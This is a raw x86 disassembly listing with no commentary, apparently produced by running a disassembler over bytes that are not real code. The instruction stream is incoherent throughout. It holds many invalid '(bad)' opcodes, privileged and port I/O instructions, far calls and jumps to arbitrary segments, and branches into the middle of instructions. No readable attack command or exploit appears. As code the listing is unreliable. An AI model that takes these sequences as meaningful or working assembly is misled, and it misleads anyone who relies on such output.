  421e71:	xchg   BYTE PTR [edi+eax*1+0x14],ah
  421e75:	mov    WORD PTR [ebx+0x52],es
  421e78:	call   0xcbeab175
  421e7d:	cmp    DWORD PTR [ebp+0x926ad94],eax
  421e83:	sbb    eax,0xe3f2427b
  421e88:	add    DWORD PTR [ecx+0x3835e850],ebp
  421e8e:	xchg   edx,eax
  421e8f:	adc    eax,0xf6398740
  421e94:	dec    edi
  421e95:	rcr    BYTE PTR ds:0xc291,cl
  421e9a:	daa    
  421e9b:	cmp    al,0xa3
  421e9d:	call   0x21f9:0x244f2df4
  421ea4:	and    bl,ah
  421ea6:	and    ebp,eax
  421ea8:	call   0x5945:0xa75ef3d9
  421eaf:	push   eax
  421eb0:	jnp    0x421f01
  421eb2:	stos   DWORD PTR es:[edi],eax
  421eb3:	loop   0x421f19
  421eb5:	nop
  421eb6:	xor    esi,ebx
  421eb8:	ficomp WORD PTR [ecx-0x5045c2b4]
  421ebe:	js     0x421f26
  421ec0:	jmp    0xde3c:0x66653d67
  421ec7:	pop    ss
  421ec8:	test   DWORD PTR [eax-0x39d58b8a],ebp
  421ece:	mov    ds:0xe6c170bd,al
  421ed3:	and    DWORD PTR [ebx],esi
  421ed5:	add    BYTE PTR [edi],al
  421ed7:	jge    0x421f2a
  421ed9:	mov    WORD PTR [esp+ebx*8+0x4d],fs
  421edd:	arpl   WORD PTR [eax-0xf],bp
  421ee0:	mov    bl,0x2f
  421ee2:	pushf  
  421ee3:	push   ebx
  421ee4:	cmp    al,0xb5
  421ee6:	aad    0xcc
  421ee8:	nop
  421ee9:	sub    ecx,DWORD PTR [ebp+0x6d5b7336]
  421eef:	jl     0x421edc
  421ef1:	inc    ebp
  421ef2:	imul   esp,DWORD PTR ds:0xa7dd8916,0x3738cba
  421efc:	test   DWORD PTR [esi+0x55d1b214],ecx
  421f02:	rol    DWORD PTR [ebx+ebx*1+0x16],0x2
  421f07:	repz pop ebp
  421f09:	retf   0x770d
  421f0c:	iret   
  421f0d:	cdq    
  421f0e:	and    ecx,edx
  421f10:	inc    ebp
  421f11:	xchg   esi,eax
  421f12:	imul   esi,DWORD PTR [edx+0x7c],0xffffffac
  421f16:	xor    cl,BYTE PTR [ebx-0x61f76603]
  421f1c:	add    al,0x4d
  421f1e:	push   cs
  421f1f:	addr16 mov esp,0x3316e798
  421f25:	leave  
  421f26:	xlat   BYTE PTR ds:[ebx]
  421f27:	loop   0x421f7d
  421f29:	mov    cl,0x89
  421f2b:	or     al,0x23
  421f2d:	(bad)  
  421f2e:	int3   
  421f2f:	aas    
  421f30:	fwait
  421f31:	add    BYTE PTR [eax],bh
  421f33:	hlt    
  421f34:	inc    eax
  421f35:	push   ebx
  421f36:	repz xor edx,eax
  421f39:	enter  0x1097,0xe0
  421f3d:	add    al,0x5e
  421f3f:	mov    dh,0x76
  421f41:	adc    al,0x5f
  421f43:	sti    
  421f44:	int3   
  421f45:	out    0x31,eax
  421f47:	repnz ficomp WORD PTR [eax+0x52]
  421f4b:	call   0xad96:0x1f392d28
  421f52:	mov    dh,dl
  421f54:	inc    esp
  421f55:	mov    bl,0x46
  421f57:	jmp    0x60b9:0x6281481b
  421f5e:	ss push edi
  421f60:	add    DWORD PTR [ebx+0x7fbe20a5],ebx
  421f66:	cmp    ebp,0xea212dfd
  421f6c:	add    ecx,0xffffffed
  421f6f:	push   ecx
  421f70:	pop    eax
  421f71:	pushf  
  421f72:	jecxz  0x421f52
  421f74:	nop
  421f75:	cmp    edi,DWORD PTR [edi+0x377ce1dc]
  421f7b:	rcr    edi,cl
  421f7d:	ss mov al,0x41
  421f80:	ja     0x421fad
  421f82:	xor    ah,BYTE PTR [esi+edx*4+0x5d]
  421f86:	xlat   BYTE PTR ds:[ebx]
  421f87:	int    0xe7
  421f89:	adc    BYTE PTR [edi+ebx*2+0x12],0xc6
  421f8e:	inc    esi
  421f8f:	sti    
  421f90:	jns    0x421fd8
  421f92:	mov    ecx,0xb3847b73
  421f97:	push   esp
  421f98:	ss jle 0x421ff7
  421f9b:	arpl   WORD PTR ds:0x6d6d161,si
  421fa1:	mov    al,0xae
  421fa3:	popf   
  421fa4:	sti    
  421fa5:	cmp    edi,DWORD PTR [esi]
  421fa7:	cld    
  421fa8:	loope  0x421fc0
  421faa:	pop    es
  421fab:	sub    DWORD PTR ds:0x6c027dc9,esp
  421fb1:	add    al,0xa0
  421fb3:	mov    edi,ds
  421fb5:	jmp    0xc4df4272
  421fba:	lods   eax,DWORD PTR ds:[esi]
  421fbb:	push   esp
  421fbc:	or     al,0x8
  421fbe:	inc    esi
  421fbf:	loopne 0x421f68
  421fc1:	cmp    ebx,DWORD PTR [ecx-0x6]
  421fc4:	push   eax
  421fc5:	xchg   ebx,eax
  421fc6:	sub    al,0x75
  421fc8:	addr16 enter 0x7b7a,0x60
  421fcd:	jns    0x42202b
  421fcf:	retf   0x8198
  421fd2:	js     0x421fc3
  421fd4:	div    DWORD PTR [ebx+0x42]
  421fd7:	out    0x86,al
  421fd9:	push   cs
  421fda:	push   esi
  421fdb:	test   BYTE PTR [ebp+0x62],ch
  421fde:	or     DWORD PTR [esi],edx
  421fe0:	(bad)  
  421fe1:	ins    DWORD PTR es:[edi],dx
  421fe2:	jecxz  0x421fae
  421fe4:	mov    dh,0x2
  421fe6:	loop   0x42205c
  421fe8:	dec    eax
  421fe9:	je     0x421ff6
  421feb:	add    bl,BYTE PTR [esp+ebp*4+0x69]
  421fef:	mov    WORD PTR [edx+edi*8-0x62d971f4],cs
  421ff6:	(bad)  
  421ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ff8:	push   edi
  421ff9:	mov    eax,ds:0xa6acda7d
  421ffe:	jg     0x421fff
  422000:	out    0x54,eax
  422002:	rcl    BYTE PTR [edx],0x94
  422005:	cmp    eax,0xc30e9c17
  42200a:	lock and bl,BYTE PTR [eax-0x29]
  42200e:	out    0x42,al
  422010:	sbb    eax,0x6b0cd44d
  422015:	push   ebx
  422016:	push   esp
  422017:	or     al,BYTE PTR [ecx-0x1d]
  42201a:	jmp    0xd5907d7c
  42201f:	out    0xb7,al
  422021:	cmp    al,0x52
  422023:	cmp    eax,0x9506fcc7
  422028:	lock in al,dx
  42202a:	xor    eax,0xe3c0aa01
  42202f:	repz cmp ch,BYTE PTR [ebx+0x628c10a1]
  422036:	test   DWORD PTR [ebp-0x1896ba4],ecx
  42203c:	test   ebx,edi
  42203e:	cmc    
  42203f:	ret    
  422040:	mov    eax,ds:0xe197d14b
  422045:	int3   
  422046:	push   edx
  422047:	push   esp
  422048:	mov    WORD PTR [edx+ebp*1],cs
  42204b:	sbb    ecx,DWORD PTR [edi]
  42204d:	hlt    
  42204e:	sbb    eax,0x81540a45
  422053:	retf   
  422054:	ins    DWORD PTR es:[edi],dx
  422055:	cmp    al,0x29
  422057:	in     al,0xfa
  422059:	adc    eax,0x658e1e3c
  42205e:	loop   0x421fe2
  422060:	mov    edx,0x1a35ec49
  422065:	inc    ebp
  422066:	jne    0x42205d
  422068:	mov    ecx,0x60f91927
  42206d:	retf   0x71ef
  422070:	pop    ebp
  422071:	in     eax,0x86
  422073:	mov    eax,0x9b93e30c
  422078:	mov    ecx,0x4fa27d13
  42207d:	cmp    DWORD PTR ds:0xe5e44e46,ebx
  422083:	fdivr  DWORD PTR [ebx+0x2]
  422086:	xchg   ch,dh
  422088:	mov    dl,0xc5
  42208a:	mov    esp,0x420891da
  42208f:	call   0xcf7d:0x644c43f4
  422096:	xchg   BYTE PTR [esi-0x66961694],dl
  42209c:	adc    DWORD PTR [esi+eiz*8-0x66],eax
  4220a0:	inc    edx
  4220a1:	inc    esi
  4220a2:	sbb    ebx,ecx
  4220a4:	in     al,0xf9
  4220a6:	gs addr16 cld 
  4220a9:	lahf   
  4220aa:	cmp    DWORD PTR [edi+0x3a],0xf
  4220ae:	jbe    0x4220c5
  4220b0:	or     al,0x1
  4220b2:	imul   ecx,DWORD PTR [ecx],0xe3af147b
  4220b8:	jb     0x422135
  4220ba:	test   BYTE PTR [edi-0x19],bl
  4220bd:	jb     0x422069
  4220bf:	pop    ebx
  4220c0:	and    BYTE PTR [esp+ebp*1],dh
  4220c3:	pop    ss
  4220c4:	into   
  4220c5:	push   ss
  4220c6:	jmp    0xe465b9f6
  4220cb:	sub    DWORD PTR [ebp-0x2b],ebp
  4220ce:	cld    
  4220cf:	test   eax,0x2e96e10b
  4220d4:	in     eax,0xac
  4220d6:	or     BYTE PTR [edx-0x6beded24],dh
  4220dc:	pop    edx
  4220dd:	inc    ecx
  4220de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220df:	popf   
  4220e0:	pop    eax
  4220e1:	hlt    
  4220e2:	scas   eax,DWORD PTR es:[edi]
  4220e3:	(bad)  
  4220e4:	test   edi,0x7296dc80
  4220ea:	pusha  
  4220eb:	iret   
  4220ec:	add    al,0x1
  4220ee:	sbb    eax,0xa5862649
  4220f3:	jmp    0x4220b4
  4220f5:	lea    eax,[ebp+0x3d]
  4220f8:	sub    dl,al
  4220fa:	sti    
  4220fb:	fcomp  DWORD PTR [ecx]
  4220fd:	inc    eax
  4220fe:	cmp    al,0x69
  422100:	dec    esp
  422101:	lahf   
  422102:	xchg   edi,ebx
  422104:	mov    eax,ds:0xf39c11f3
  422109:	cs inc ebx
  42210b:	mov    ch,0xa1
  42210d:	out    dx,eax
  42210e:	push   es
  42210f:	jnp    0x422157
  422111:	iret   
  422112:	dec    edx
  422113:	mov    bl,0xbd
  422115:	mov    ds:0xc7d4f058,al
  42211a:	test   eax,0x2eb06c30
  42211f:	inc    esi
  422120:	and    DWORD PTR [ebx],ebx
  422122:	scas   eax,DWORD PTR es:[edi]
  422123:	pop    ebx
  422124:	xlat   BYTE PTR ds:[ebx]
  422125:	sahf   
  422126:	not    edx
  422128:	dec    esp
  422129:	popa   
  42212a:	mov    esi,0xe78e51e9
  42212f:	dec    eax
  422130:	push   ebp
  422131:	in     al,0x2b
  422133:	out    dx,al
  422134:	rol    DWORD PTR [eax-0x1bfc3936],cl
  42213a:	bound  ebx,QWORD PTR [eax+0x73]
  42213d:	pop    esi
  42213e:	cmp    eax,0xb98f778c
  422143:	(bad)  
  422144:	mov    ds:0xbb66b083,eax
  422149:	dec    ebp
  42214a:	cmp    BYTE PTR [edx+0x365e1787],al
  422150:	xchg   esp,eax
  422151:	inc    sp
  422153:	mov    dl,0x2d
  422155:	sti    
  422156:	adc    eax,DWORD PTR [edi+ebx*2-0x8]
  42215a:	sub    BYTE PTR [ebx],bl
  42215c:	bound  edi,QWORD PTR [eax]
  42215e:	push   0x2557d1e7
  422163:	in     al,dx
  422164:	inc    esi
  422165:	or     eax,0xedf0f92
  42216a:	mov    edi,0xb8fb1198
  42216f:	test   eax,0xba681963
  422174:	ins    BYTE PTR es:[edi],dx
  422175:	aad    0x7e
  422177:	in     al,dx
  422178:	xchg   DWORD PTR [edx-0x66],ebx
  42217b:	mov    eax,0xf52650ef
  422180:	dec    esi
  422181:	dec    ebx
  422182:	jno    0x42213f
  422184:	xor    ch,bl
  422186:	jo     0x4221ec
  422188:	adc    al,0x8a
  42218a:	cmp    eax,edi
  42218c:	(bad)  
  42218d:	xor    al,dh
  42218f:	jno    0x42211a
  422191:	iret   
  422192:	xchg   esi,eax
  422193:	and    eax,0xee144aa9
  422198:	push   ebp
  422199:	addr16 std 
  42219b:	mov    esi,0x84e066cc
  4221a0:	popf   
  4221a1:	test   eax,0x8e8c1cca
  4221a6:	push   cs
  4221a7:	and    al,0x9e
  4221a9:	sbb    al,0x84
  4221ab:	sbb    ebp,esp
  4221ad:	inc    esp
  4221ae:	std    
  4221af:	inc    eax
  4221b0:	inc    ebx
  4221b1:	aaa    
  4221b2:	popa   
  4221b3:	rol    ebx,1
  4221b5:	jmp    0x5b77:0x11f2ddb2
  4221bc:	ret    
  4221bd:	mov    ecx,DWORD PTR [esi+ecx*2]
  4221c0:	ins    BYTE PTR es:[edi],dx
  4221c1:	push   esi
  4221c2:	sbb    DWORD PTR [edi+esi*8],0xfffffffa
  4221c6:	(bad)  
  4221c8:	das    
  4221c9:	pusha  
  4221ca:	outs   dx,DWORD PTR ds:[esi]
  4221cb:	pop    esi
  4221cc:	fcomp  DWORD PTR [ecx+edx*8]
  4221cf:	push   ebp
  4221d0:	mov    bl,0xa5
  4221d2:	fs xor al,0x51
  4221d5:	xchg   ecx,eax
  4221d6:	xchg   esi,eax
  4221d7:	mov    edi,0x6160a83f
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	adc    BYTE PTR [edi-0x20eebe2c],cl
  4221e3:	push   ss
  4221e4:	idiv   BYTE PTR [edi+0x7d]
  4221e7:	jl     0x422181
  4221e9:	add    esp,DWORD PTR [ecx-0x33d76d44]
  4221ef:	aam    0x50
  4221f1:	icebp  
  4221f2:	xchg   edi,eax
  4221f3:	pop    ebp
  4221f5:	xchg   DWORD PTR [edx+0x60930359],ecx
  4221fb:	sub    ebp,ebp
  4221fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221fe:	fucomp st(7)
  422200:	fstp   TBYTE PTR [ecx+ebp*4-0x3b6414bc]
  422207:	sar    BYTE PTR [esi+0x71],1
  42220a:	and    eax,0x2a603e1d
  42220f:	pop    edx
  422210:	pop    ss
  422211:	ss sub eax,0xc1b85425
  422217:	and    edi,DWORD PTR [ecx]
  422219:	xchg   esp,eax
  42221a:	lds    edx,FWORD PTR [esi]
  42221c:	cld    
  42221d:	pushf  
  42221e:	(bad)  
  42221f:	pop    ebp
  422220:	pop    ebp
  422221:	xchg   edi,eax
  422222:	ds mov esp,0xc16a4a38
  422228:	scas   al,BYTE PTR es:[edi]
  422229:	sar    BYTE PTR [edx+0x48],cl
  42222c:	mov    bl,0x91
  42222e:	sub    edx,edx
  422230:	(bad)  
  422231:	mov    cl,0xe3
  422233:	pcmpeqw mm6,mm7
  422236:	adc    dh,BYTE PTR cs:[edi]
  422239:	xchg   DWORD PTR [ecx],eax
  42223b:	dec    ebp
  42223c:	fcomip st,st(5)
  42223e:	into   
  42223f:	mov    cl,0x7b
  422241:	add    BYTE PTR [ecx+0x55ebbc96],cl
  422247:	mov    ch,ah
  422249:	push   esp
  42224a:	sbb    al,0xbf
  42224c:	out    dx,al
  42224d:	stos   DWORD PTR es:[edi],eax
  42224e:	fwait
  42224f:	gs xchg edx,eax
  422251:	or     DWORD PTR [ecx+0x1],edx
  422254:	outs   dx,DWORD PTR ds:[esi]
  422255:	sti    
  422256:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  422258:	dec    ecx
  422259:	mov    edi,esp
  42225b:	shr    BYTE PTR [ecx],cl
  42225d:	test   cl,bl
  42225f:	inc    ecx
  422260:	js     0x422226
  422262:	call   0x5310:0x46f09a34
  422269:	enter  0xeda1,0x97
  42226d:	(bad)  
  42226e:	in     al,dx
  42226f:	outs   dx,BYTE PTR ds:[esi]
  422270:	bound  edx,QWORD PTR es:[ebx+0x2052b2a6]
  422277:	call   0x987a:0xcabd4bdb
  42227e:	sbb    DWORD PTR [ebx-0x5d],ebx
  422281:	cmp    edi,DWORD PTR [esp+edi*1+0x4b]
  422285:	sub    ch,BYTE PTR [esi+esi*1+0x35]
  422289:	fs xchg esi,eax
  42228b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42228c:	mov    DWORD PTR [ebx],edi
  42228e:	lahf   
  42228f:	mov    al,ds:0x808a7f6f
  422294:	into   
  422295:	sbb    esp,DWORD PTR [eax]
  422297:	xchg   esp,eax
  422298:	outs   dx,BYTE PTR ds:[esi]
  422299:	dec    edi
  42229a:	outs   dx,BYTE PTR ds:[esi]
  42229b:	adc    DWORD PTR [ebx-0x704a932a],edi
  4222a1:	aas    
  4222a2:	cmc    
  4222a3:	cmp    BYTE PTR [ebx],al
  4222a5:	lahf   
  4222a6:	xchg   esp,eax
  4222a7:	sbb    ah,BYTE PTR [eax+0x30]
  4222aa:	adc    DWORD PTR [ecx-0x5b],edx
  4222ad:	call   0xe5f5:0xcdff58e
  4222b4:	das    
  4222b5:	ud0    esi,DWORD PTR [esi-0x1a]
  4222b9:	cmp    eax,0x1655ee85
  4222be:	(bad)  
  4222bf:	mov    edi,0xb8da7c7a
  4222c4:	lea    esi,[edi]
  4222c6:	(bad)  
  4222c7:	mov    dl,0x20
  4222c9:	(bad)  
  4222cb:	dec    edi
  4222cc:	pop    edx
  4222cd:	(bad)  
  4222ce:	xor    DWORD PTR [ebx+0x6b8dc9b6],ebx
  4222d4:	(bad)  
  4222d6:	push   ebx
  4222d7:	mov    cl,0x36
  4222d9:	call   0x2b3:0xe3470cda
  4222e0:	mov    eax,ds:0x5fbdaf1
  4222e5:	imul   edi,ecx,0xffffffb7
  4222e8:	mov    eax,0xa4adf0c0
  4222ed:	ret    
  4222ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222ef:	sub    ebp,edi
  4222f1:	pop    ebp
  4222f2:	jno    0x422342
  4222f4:	adc    DWORD PTR [esi+ecx*2+0x56],esp
  4222f8:	sub    ecx,DWORD PTR [ebp-0x11e6301b]
  4222fe:	enter  0x7e15,0x66
  422302:	add    eax,0x40a64c6a
  422307:	or     DWORD PTR [esi-0x4de6bced],esi
  42230d:	xor    ecx,DWORD PTR [edx+0x4ec2d31b]
  422313:	jmp    0x1209:0x831fa915
  42231a:	adc    edx,DWORD PTR [eax+0x3c]
  42231d:	mov    al,ds:0x158be1e3
  422322:	ret    
  422323:	mov    ch,0x95
  422325:	cli    
  422326:	dec    edx
  422327:	add    edx,DWORD PTR [ebp+0x52599b9d]
  42232d:	out    0x89,al
  42232f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422330:	bswap  ebx
  422332:	test   eax,0xa4d070a9
  422337:	sub    al,0xa6
  422339:	mov    ecx,0x51502064
  42233e:	xchg   esi,eax
  42233f:	and    BYTE PTR [ecx-0x32],bh
  422342:	js     0x4222fe
  422344:	sbb    DWORD PTR [eax-0x8],ebp
  422347:	pusha  
  422348:	push   ecx
  422349:	mov    BYTE PTR ds:0xd9951a0d,ch
  42234f:	mov    eax,0xf4cb19a
  422354:	int    0xbb
  422356:	adc    DWORD PTR [ecx+0x18],ebx
  422359:	push   ds
  42235a:	jge    0x42230a
  42235c:	cdq    
  42235d:	xlat   BYTE PTR ds:[ebx]
  42235e:	dec    esi
  42235f:	stc    
  422360:	push   esp
  422361:	retf   
  422362:	sahf   
  422363:	mov    edx,0x644d529c
  422368:	fdivr  DWORD PTR [eax+0x51fcbbe2]
  42236e:	add    eax,0xaaa97904
  422373:	cmp    al,0xe0
  422375:	clc    
  422376:	(bad)  
  422377:	lahf   
  422378:	push   edi
  422379:	sbb    DWORD PTR [ebx+0x56],ebp
  42237c:	aas    
  42237d:	jmp    0x2202:0x546efaac
  422384:	(bad)  [ebx-0x3]
  422387:	lahf   
  422388:	cmp    BYTE PTR [esi],dl
  42238a:	test   al,0xbd
  42238c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42238d:	fcmovne st,st(0)
  42238f:	(bad)  
  422390:	push   edx
  422391:	mov    DWORD PTR [ebp-0x178ee2f9],0x4d7584a5
  42239b:	xchg   ecx,eax
  42239c:	xor    esp,esi
  42239e:	cs xchg esp,eax
  4223a0:	xchg   edx,eax
  4223a1:	mov    esp,0xa831044d
  4223a6:	xor    eax,0x2e4c36b
  4223ab:	add    bl,0x26
  4223ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b0:	lock pop ss
  4223b2:	pop    edi
  4223b3:	push   ds
  4223b4:	pushf  
  4223b5:	push   es
  4223b6:	(bad)  
  4223b7:	ss xor eax,0xf948e2ad
  4223bd:	sub    eax,0x77a26910
  4223c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c3:	cmc    
  4223c4:	xlat   BYTE PTR ds:[ebx]
  4223c5:	jmp    0xc3c6f2b6
  4223ca:	fmul   DWORD PTR [eax]
  4223cc:	call   DWORD PTR [edi]
  4223ce:	mov    esi,0x63140099
  4223d3:	aam    0x8
  4223d5:	aam    0xca
  4223d7:	dec    ebx
  4223d8:	in     al,0x1a
  4223da:	xor    al,0xcf
  4223dd:	sahf   
  4223de:	xor    bl,bh
  4223e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e1:	push   ebx
  4223e2:	stc    
  4223e3:	sub    BYTE PTR [edx+0x72bc723d],0xba
  4223ea:	sahf   
  4223eb:	cmp    DWORD PTR [edi-0x34],esi
  4223ee:	addr16 jne 0x422427
  4223f1:	push   ecx
  4223f2:	mov    eax,0x8c60318
  4223f7:	pop    ss
  4223f8:	(bad)  
  4223f9:	pop    esp
  4223fa:	inc    eax
  4223fb:	into   
  4223fc:	jle    0x42243e
  4223fe:	ret    0x4ea4
  422401:	mov    al,0x31
  422403:	inc    edx
  422404:	int    0xe1
  422406:	pop    ebx
  422407:	push   es
  422408:	inc    edx
  422409:	fbld   TBYTE PTR [ebx]
  42240b:	sub    DWORD PTR ds:0x518d115d,0x29
  422412:	xchg   ah,ah
  422414:	iret   
  422415:	sub    dh,dh
  422417:	cmp    edx,edx
  422419:	and    esi,DWORD PTR [eax-0x1c]
  42241c:	mov    fs,WORD PTR [ecx]
  42241e:	(bad)  [edi-0x596cdbe5]
  422424:	push   ebp
  422425:	fadd   QWORD PTR [edi+0x58]
  422428:	mov    bl,0xd7
  42242a:	ja     0x422406
  42242c:	push   esp
  42242d:	nop
  42242e:	xor    dh,BYTE PTR [esi]
  422430:	sub    BYTE PTR [ecx-0x5ee6dcac],cl
  422436:	test   eax,0x45d40bcb
  42243b:	mov    ds:0xd45ce77,al
  422440:	out    dx,al
  422441:	xchg   esp,eax
  422442:	sub    ax,0xff85
  422446:	inc    esp
  422447:	mov    cl,0x2e
  422449:	test   BYTE PTR [edx+eiz*2],0x1
  42244d:	cmp    cl,bl
  42244f:	add    edx,DWORD PTR ds:0x7997b8df
  422455:	xor    ch,BYTE PTR [eax-0x534a835b]
  42245b:	lods   al,BYTE PTR ds:[esi]
  42245c:	mov    cs,WORD PTR [edx-0x3a]
  42245f:	pushf  
  422460:	cmp    DWORD PTR [ecx+0x47],ecx
  422463:	xchg   edx,eax
  422464:	pushf  
  422465:	sahf   
  422466:	push   es
  422467:	outs   dx,DWORD PTR ds:[esi]
  422468:	imul   edi,DWORD PTR [edx+edx*8],0x42
  42246c:	cwde   
  42246d:	aas    
  42246e:	and    BYTE PTR [edx],al
  422470:	cli    
  422471:	(bad)  [ebx-0x30]
  422474:	lds    esp,FWORD PTR [edi+0x6930470c]
  42247a:	gs dec edi
  42247c:	retf   0x80ed
  42247f:	pop    edi
  422480:	push   cs
  422481:	shr    BYTE PTR [eax],cl
  422483:	ds mov bh,0x47
  422486:	out    dx,eax
  422487:	xchg   esi,eax
  422488:	mov    ah,0xee
  42248a:	xor    DWORD PTR [esi+0x7bed08d9],ebx
  422490:	repz pop es
  422492:	(bad)  
  422493:	xor    DWORD PTR [eax-0x3ce2f2e3],esp
  422499:	jge    0x422454
  42249b:	and    DWORD PTR [ebx+0x44],0xffffff9b
  42249f:	addr16 out dx,al
  4224a1:	addr16 inc ecx
  4224a3:	and    DWORD PTR [ecx-0xf817b8b],ebp
  4224a9:	out    dx,eax
  4224aa:	jge    0x4224f1
  4224ac:	mov    ebx,0x3d80a787
  4224b1:	push   0x55
  4224b3:	in     al,0xa1
  4224b5:	xchg   edi,eax
  4224b6:	imul   esp,DWORD PTR [ecx+0x5e026273],0xf76711fe
  4224c0:	jle    0x42245d
  4224c2:	and    al,0xe2
  4224c4:	test   DWORD PTR [esi],0xdd82f0b6
  4224ca:	sbb    eax,0x31fa7790
  4224cf:	mov    ah,0xf5
  4224d1:	aas    
  4224d2:	repz sgdtd [eax+0x67]
  4224d7:	(bad)  
  4224d8:	push   ecx
  4224d9:	loop   0x422473
  4224db:	or     BYTE PTR [edi+0x5c29e5f3],0x38
  4224e2:	pop    edx
  4224e3:	mov    esi,DWORD PTR [edi-0x4e1ae7b4]
  4224e9:	jo     0x4224eb
  4224eb:	(bad)  
  4224ec:	xor    eax,0x858afcc1
  4224f1:	inc    edi
  4224f2:	ret    0xc130
  4224f5:	nop
  4224f6:	jge    0x42250a
  4224f8:	mov    ebp,0x9042b597
  4224fd:	jns    0x422546
  4224ff:	scas   al,BYTE PTR es:[edi]
  422500:	cmp    ch,0xc9
  422503:	out    0x91,eax
  422505:	or     dh,BYTE PTR [eax+0x78]
  422508:	jp     0x4224fc
  42250a:	xchg   ebp,eax
  42250b:	add    eax,0xf2d98f48
  422510:	sar    BYTE PTR [ecx],1
  422512:	addr16 ret 0x5c78
  422516:	iret   
  422517:	xchg   ecx,eax
  422518:	adc    DWORD PTR [eax-0x3d],edx
  42251b:	push   edi
  42251c:	in     eax,0x25
  42251e:	ror    BYTE PTR [edx+eiz*8],1
  422521:	retf   0xc922
  422524:	push   ss
  422525:	xor    bh,BYTE PTR [ebp+0x3f87c184]
  42252b:	xchg   esi,eax
  42252c:	(bad)  
  42252d:	cld    
  42252e:	pop    ebx
  42252f:	icebp  
  422530:	cwde   
  422531:	dec    esi
  422532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422534:	xor    BYTE PTR [edi],bh
  422536:	cmp    DWORD PTR [ebp+ecx*2+0x32],edi
  42253a:	les    edx,FWORD PTR [edx+0x314e775b]
  422540:	lods   al,BYTE PTR ds:[esi]
  422541:	cwde   
  422542:	in     al,dx
  422543:	std    
  422544:	mov    esp,0x52417903
  422549:	dec    ecx
  42254a:	adc    eax,edi
  42254c:	jle    0x4225c7
  42254e:	mov    cl,0x7c
  422550:	pop    ss
  422551:	adc    al,0xa9
  422553:	popa   
  422554:	push   ds
  422555:	fs ret 
  422557:	fwait
  422558:	lds    edi,FWORD PTR [ecx+0x2c]
  42255b:	mov    ah,BYTE PTR [ebp-0x7dfb276d]
  422561:	adc    ebx,esi
  422563:	push   esi
  422564:	xchg   ecx,eax
  422565:	push   esi
  422566:	push   ebx
  422567:	retf   
  422568:	outs   dx,DWORD PTR ds:[esi]
  422569:	jg     0x42258f
  42256b:	gs out dx,al
  42256d:	and    dh,BYTE PTR [edx]
  42256f:	adc    eax,0xa4cf4d65
  422574:	aam    0xa6
  422576:	jns    0x422536
  422578:	ins    DWORD PTR es:[edi],dx
  422579:	addr16 jnp 0x422573
  42257c:	jle    0x422567
  42257e:	int    0xb9
  422580:	sbb    dl,dh
  422582:	jg     0x42253c
  422584:	imul   edi,esi,0x2eb5c69e
  42258a:	sub    ah,BYTE PTR [esi]
  42258c:	aas    
  42258d:	cs sbb al,0x65
  422590:	or     bh,BYTE PTR [ecx+0x4f]
  422593:	mul    eax
  422595:	mov    bl,0xb6
  422597:	scas   eax,DWORD PTR es:[edi]
  422598:	mov    ebx,0x5848e9a
  42259d:	inc    edi
  42259e:	call   0xb4fbef3d
  4225a3:	mov    dh,0x55
  4225a5:	sub    al,0xa1
  4225a7:	jp     0x4225d0
  4225a9:	icebp  
  4225aa:	bnd call 0x3b1522a3
  4225b0:	mov    edi,0x7a23713c
  4225b5:	(bad)  
  4225b6:	imul   edx,edx,0xffffffea
  4225b9:	sbb    eax,0x9fa1d126
  4225be:	add    edx,edi
  4225c0:	and    ebp,DWORD PTR [edi-0x761aa0f]
  4225c6:	(bad)  
  4225c7:	pusha  
  4225c8:	xchg   DWORD PTR [esi-0x41],eax
  4225cb:	inc    ecx
  4225cc:	mov    cl,0x1
  4225ce:	mov    eax,ds:0x3b7b61bf
  4225d3:	mov    ds:0x9ef16ef,al
  4225d8:	inc    edi
  4225d9:	sub    eax,0x47eb27d0
  4225de:	mov    dl,BYTE PTR [eax+0x40]
  4225e1:	jno    0x422609
  4225e3:	push   ebp
  4225e4:	adc    BYTE PTR [edi-0x611ebe51],al
  4225ea:	dec    eax
  4225eb:	aas    
  4225ec:	xlat   BYTE PTR ds:[ebx]
  4225ed:	cmp    BYTE PTR [eax-0x57],0x65
  4225f1:	add    DWORD PTR [edi-0x250a42a5],ebp
  4225f7:	in     al,dx
  4225f8:	mov    bh,0x3b
  4225fa:	dec    edx
  4225fb:	and    DWORD PTR [esi+0x31],edx
  4225fe:	jae    0x422669
  422600:	mov    eax,ds:0x64f2d1ad
  422605:	mov    ds:0x4eb1677c,al
  42260a:	xor    eax,0x3e8c31fa
  42260f:	mov    bh,0xed
  422611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422612:	in     al,dx
  422613:	lods   al,BYTE PTR ds:[esi]
  422614:	xlat   BYTE PTR ds:[ebx]
  422615:	imul   esi,DWORD PTR [ecx-0x37],0x62
  422619:	retf   
  42261a:	(bad)  
  42261b:	pop    edx
  42261c:	mov    dh,0x4f
  42261e:	mov    bh,0x8f
  422620:	sbb    cl,BYTE PTR [edi+0x2]
  422623:	pop    ebx
  422624:	aaa    
  422625:	nop
  422626:	fxch   st(4)
  422628:	push   ss
  422629:	ins    DWORD PTR es:[edi],dx
  42262a:	clc    
  42262b:	sub    al,cl
  42262d:	push   ecx
  42262e:	sahf   
  42262f:	cmp    eax,0xe20fd971
  422634:	dec    edx
  422635:	ins    DWORD PTR es:[edi],dx
  422636:	lods   eax,DWORD PTR ds:[esi]
  422637:	push   edx
  422638:	push   ecx
  422639:	scas   eax,DWORD PTR es:[edi]
  42263a:	cld    
  42263b:	sub    eax,0x5b751b9e
  422640:	outs   dx,DWORD PTR ds:[esi]
  422641:	popf   
  422642:	clc    
  422643:	sub    edx,edx
  422645:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
